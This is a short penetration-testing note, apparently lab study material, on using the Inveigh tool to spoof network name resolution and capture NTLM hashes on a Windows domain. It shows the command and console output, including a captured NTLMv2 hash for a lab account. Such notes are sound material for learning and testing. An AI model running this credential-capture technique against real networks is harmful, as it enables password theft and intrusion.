---
tags:
  - hack
  - windows
---
# Using Inveigh

## Using Inveigh to Capture Hashes

[Inveigh](https://github.com/Kevin-Robertson/Inveigh) is a Windows tool for "Adversary in the Middle" attacks, useful for capturing NTLM hashes. It's available as a C# executable, with an older, unmaintained version written in PowerShell. There's a [wiki page with parameters](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) available.

The following example requires an elevated PS prompt.

```powershell
PS C:\tools> .\inveigh.exe
[*] Inveigh 2.0.4 [Started 2024-07-22T10:28:43 | PID 5460]
[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::d925:4cf:36c0:9502%8]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::d925:4cf:36c0:9502%8]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[ ] DHCPv6
[+] DNS Packet Sniffer [Type A]
[ ] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[ ] MDNS
[ ] NBNS
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[ ] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[ ] Proxy
[+] LDAP Listener [Port 389]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\tools]
[+] Previous Session Files [Imported]
[*] Press ESC to enter/exit interactive console
[!] Failed to start HTTP listener on port 80, check IP and port usage.
[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.
...
[.] [10:29:03] TCP(445) SYN packet from 172.16.5.130:50878
[.] [10:29:03] SMB1(445) negotiation request detected from 172.16.5.130:50878
[.] [10:29:03] SMB2+(445) negotiation request detected from 172.16.5.130:50878
[+] [10:29:03] SMB(445) NTLM challenge [D57F545898D26EDB] sent to 172.16.5.25:50878
[+] [10:29:03] SMB(445) NTLMv2 captured for [INLANEFREIGHT\backupagent] from 172.16.5.130(ACADEMY-EA-FILE):50878:
backupagent::INLANEFREIGHT:D57F545898D26EDB:572C91C53880832953A3F28F97053959:0101000000000000034E84A55CDCDA01B77CD26D287575D10000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800034E84A55CDCDA0106000400020000000800300030000000000000000000000000300000191EB313E7AD39E2EB1448479A0A923B7E508D00D6DBE00395B8893C7A846E9C0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
[!] [10:29:03] SMB(445) NTLMv2 for [INLANEFREIGHT\backupagent] written to Inveigh-NTLMv2.txt
...
```
